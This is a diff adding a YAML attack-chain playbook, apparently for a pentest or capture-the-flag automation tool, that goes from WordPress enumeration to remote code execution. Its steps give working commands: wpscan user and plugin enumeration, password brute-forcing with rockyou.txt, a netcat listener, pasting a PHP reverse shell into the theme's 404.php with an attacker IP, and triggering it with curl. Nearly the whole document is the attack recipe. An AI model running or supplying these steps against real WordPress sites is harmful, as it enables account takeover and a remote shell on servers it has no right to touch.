@@ -1,0 +1,58 @@
+chain_id: wordpress_enum_to_rce
+title: "WordPress — wpscan enumeration to template-edit RCE"
+severity: HIGH
+tags: [web, wordpress, wpscan, rce, reverse-shell, template-injection]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/wp-(login|admin|content|includes)" }
+    - { path_in: ["/wp-login.php", "/wp-admin", "/wp-content", "/xmlrpc.php"] }
+    - { banner_pattern: "(?i)wordpress" }
+
+description: |
+  WordPress install detected via gobuster (any /wp-* path). The path of least
+  resistance is wpscan: enumerate users/plugins/themes, brute-force a found
+  user, then — if the role is Administrator — overwrite a theme template
+  (404.php) with a PHP reverse shell and trigger it.
+
+steps:
+  - id: 1
+    title: "Initial enumeration (users, plugins, themes)"
+    command: wpscan --url http://$VICTIMA --enumerate u,p,t
+
+  - id: 2
+    title: "Aggressive plugin enumeration (looks for vulnerable ones)"
+    command: wpscan --url http://$VICTIMA --enumerate ap --plugins-detection aggressive
+
+  - id: 3
+    title: "If a user is found, brute-force the password"
+    command: wpscan --url http://$VICTIMA --usernames USUARIO --passwords /usr/share/wordlists/rockyou.txt --threads 20
+    notes: |
+      If the box has its own dictionary (e.g. downloaded via robots.txt or FTP),
+      use that instead of rockyou.txt.
+
+  - id: 4
+    title: "Login at /wp-login.php with the discovered credentials"
+    notes: |
+      Open http://$VICTIMA/wp-login.php in the browser and enter the creds.
+      If the role is Administrator you can edit theme templates.
+
+  - id: 5
+    title: "Listener on Kali"
+    command: nc -lvnp 4444
+
+  - id: 6
+    title: "Insert a PHP webshell into the 404 template"
+    command: cat /usr/share/webshells/php/php-reverse-shell.php
+    notes: |
+      In the panel: Apariencia → Editor de temas → 404.php. Paste the file
+      contents, change $ip='10.0.2.15' and $port=4444, click 'Actualizar
+      archivo'.
+
+  - id: 7
+    title: "Trigger the 404 from Kali"
+    command: curl http://$VICTIMA/wp-content/themes/<nombre_tema>/404.php
+
+references:
+  - https://github.com/wpscanteam/wpscan
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
